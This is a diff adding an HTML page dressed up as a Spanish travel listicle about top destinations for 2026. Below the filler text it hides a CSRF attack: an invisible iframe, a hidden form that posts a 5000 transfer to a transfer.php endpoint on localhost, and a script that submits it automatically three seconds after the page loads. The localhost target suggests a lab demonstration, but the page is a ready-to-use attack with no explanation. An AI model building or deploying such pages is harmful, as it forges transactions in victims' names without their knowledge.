@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Artículo Interesante</title>
+</head>
+<body>
+    <h1>Los 10 mejores destinos turísticos 2026</h1>
+    <p>Descubre los lugares más increíbles para visitar este año...</p>
+    <img src="imagen1.jpg" alt="Destino 1">
+    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit...</p>
+    
+    <!-- Ataque CSRF invisible mediante iframe -->
+    <iframe style="display:none" name="csrf_frame"></iframe>
+    
+    <form id="stealthForm" method="post" action="http://localhost/transfer.php" target="csrf_frame">
+        <input hidden type="number" name="amount" value="5000">
+    </form>
+
+    <script>
+        // Ejecuta después de 3 segundos (cuando el usuario está leyendo)
+        setTimeout(function() {
+            document.getElementById('stealthForm').submit();
+        }, 3000);
+    </script>
+</body>
+</html>
